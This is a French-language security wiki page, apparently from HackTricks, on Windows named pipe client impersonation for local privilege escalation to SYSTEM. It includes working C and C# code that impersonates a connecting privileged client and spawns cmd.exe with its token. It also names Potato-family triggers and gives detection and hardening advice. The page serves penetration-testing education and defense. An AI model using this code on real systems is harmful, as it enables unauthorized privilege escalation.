# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation est une primitive d'escalade de privilèges locale qui permet à un thread serveur de named-pipe d'adopter le contexte de sécurité d'un client qui s'y connecte. En pratique, un attaquant capable d'exécuter du code avec SeImpersonatePrivilege peut contraindre un client privilégié (par ex. un service SYSTEM) à se connecter à un pipe contrôlé par l'attaquant, appeler ImpersonateNamedPipeClient, dupliquer le token résultant en un token primaire, et lancer un processus en tant que client (souvent NT AUTHORITY\SYSTEM).

Cette page se concentre sur la technique de base. Pour des chaînes d'exploitation de bout en bout qui forcent SYSTEM à se connecter à votre pipe, voir les pages Potato family référencées ci-dessous.

## TL;DR
- Créer un named pipe: \\.\pipe\<random> et attendre une connexion.
- Forcer un composant privilégié à s'y connecter (spooler/DCOM/EFSRPC/etc.).
- Lire au moins un message depuis le pipe, puis appeler ImpersonateNamedPipeClient.
- Ouvrir le token d'impersonation depuis le thread courant, DuplicateTokenEx(TokenPrimary), et CreateProcessWithTokenW/CreateProcessAsUser pour obtenir un processus SYSTEM.

## Exigences et APIs clés
- Privilèges généralement requis par le processus/thread appelant :
- SeImpersonatePrivilege pour impersonner avec succès un client qui se connecte et pour utiliser CreateProcessWithTokenW.
- Alternativement, après avoir impersonné SYSTEM, vous pouvez utiliser CreateProcessAsUser, ce qui peut nécessiter SeAssignPrimaryTokenPrivilege et SeIncreaseQuotaPrivilege (ces privilèges sont satisfaits lorsque vous impersonnez SYSTEM).
- APIs principales utilisées :
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (il faut lire au moins un message avant l'impersonation)
- ImpersonateNamedPipeClient et RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level : pour effectuer des actions utiles localement, le client doit autoriser SecurityImpersonation (par défaut pour de nombreux clients RPC/named-pipe locaux). Les clients peuvent abaisser ce niveau avec SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION lors de l'ouverture du pipe.

## Flux de travail Win32 minimal (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Remarques :
- Si ImpersonateNamedPipeClient renvoie ERROR_CANNOT_IMPERSONATE (1368), assurez-vous d'avoir lu depuis le pipe en premier et que le client n'ait pas restreint l'impersonation au niveau Identification.
- Préférez DuplicateTokenEx avec SecurityImpersonation et TokenPrimary pour créer un token primaire adapté à la création de processus.

## .NET exemple rapide
Dans .NET, NamedPipeServerStream peut effectuer de l'impersonation via RunAsClient. Une fois en impersonation, dupliquez le token du thread et créez un processus.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Déclencheurs/contraintes courants pour forcer SYSTEM à se connecter à votre pipe
Ces techniques forcent des services privilégiés à se connecter à votre named pipe afin que vous puissiez les usurper :
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Voir l'utilisation détaillée et la compatibilité ici :

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Si vous avez juste besoin d'un exemple complet de création du pipe et d'usurpation pour lancer SYSTEM depuis un déclencheur de service, voir :

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Dépannage et pièges à éviter
- Vous devez lire au moins un message depuis le pipe avant d'appeler ImpersonateNamedPipeClient ; sinon vous obtiendrez ERROR_CANNOT_IMPERSONATE (1368).
- Si le client se connecte avec SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, le serveur ne peut pas usurper complètement ; vérifiez le niveau d'usurpation du token via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW exige SeImpersonatePrivilege sur l'appelant. Si cela échoue avec ERROR_PRIVILEGE_NOT_HELD (1314), utilisez CreateProcessAsUser après vous être déjà fait passer pour SYSTEM.
- Assurez-vous que le descripteur de sécurité de votre pipe permet au service ciblé de se connecter si vous le durcissez ; par défaut, les pipes sous \\.\pipe sont accessibles selon la DACL du serveur.

## Détection et durcissement
- Surveillez la création et les connexions de named pipe. Les Sysmon Event IDs 17 (Pipe Created) et 18 (Pipe Connected) sont utiles pour établir une référence des noms de pipe légitimes et détecter des pipes inhabituels ou aléatoires précédant des événements de manipulation de token.
- Recherchez des séquences : un processus crée un pipe, un service SYSTEM se connecte, puis le processus créateur lance un processus enfant en tant que SYSTEM.
- Réduisez l'exposition en retirant SeImpersonatePrivilege des comptes de service non essentiels et en évitant les logons de service inutiles avec des privilèges élevés.
- Développement défensif : lors de la connexion à des named pipes non fiables, spécifiez SECURITY_SQOS_PRESENT avec SECURITY_IDENTIFICATION pour empêcher les serveurs d'usurper complètement le client sauf si nécessaire.

## Références
- Windows : ImpersonateNamedPipeClient documentation (exigences et comportement d'impersonation). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
